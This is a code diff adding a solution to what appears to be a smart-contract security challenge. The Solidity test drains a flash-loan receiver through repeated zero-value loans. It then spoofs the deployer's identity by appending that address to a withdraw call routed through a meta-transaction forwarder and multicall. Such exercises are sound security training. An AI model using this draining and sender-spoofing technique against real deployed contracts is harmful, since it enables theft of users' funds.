@@ -77,7 +77,44 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // total amount needed to pass challenge
+        uint256 amountToWithdraw = pool.deposits(deployer) + weth.balanceOf(address(receiver));
+        // build multicall data array to drain reciever and pool
+        bytes[] memory multicallData = new bytes[](11);
+        // drain the receiver contract by taking out 10 flash loans of no value which will approve and send their entire balance (10 weth) to the pool contract as fee payments
+        for (uint256 i = 0; i < 10; i++) {
+            multicallData[i] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, address(weth), 0, "");
+        }
+
+        // this simple approach did not work
+        // pool.deposits(address(pool)) = 0 here so calling withdraw wont work, even though that would be easiest
+        // uint256 amount = weth.balanceOf(address(pool));
+        // multicallData[10] = abi.encodeWithSelector(pool.withdraw.selector, amount, recovery);
+        // pool.multicall(multicallData);
+
+        // Calling multicall directly doesnt seem to be the solution since we need the withdraw call to go through the fowarder and we need to keep total txs down to pass challenge
+        // to get arround this I can encode the multicall itself into a request and send that with 10 flashloans and the withdraw all in one request
+        // Need to go through the fowarder since the NativeReceiverPool::_msgSender can be tricked if the call comes from the fowarder
+        // encode withdraw function call with deployer address at the end to trick NativeReceiverPool::_msgSender into thinking deployer is calling withdraw
+        multicallData[10] =
+            abi.encodePacked(abi.encodeWithSelector(pool.withdraw.selector, amountToWithdraw, recovery), deployer);
+        bytes memory data = abi.encodeWithSelector(pool.multicall.selector, multicallData);
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: gasleft(),
+            nonce: forwarder.nonces(player),
+            data: data,
+            deadline: block.timestamp + 1 weeks
+        });
+        bytes32 requestHash = forwarder.getDataHash(request);
+        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), requestHash));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute(request, signature);
     }
 
     /**
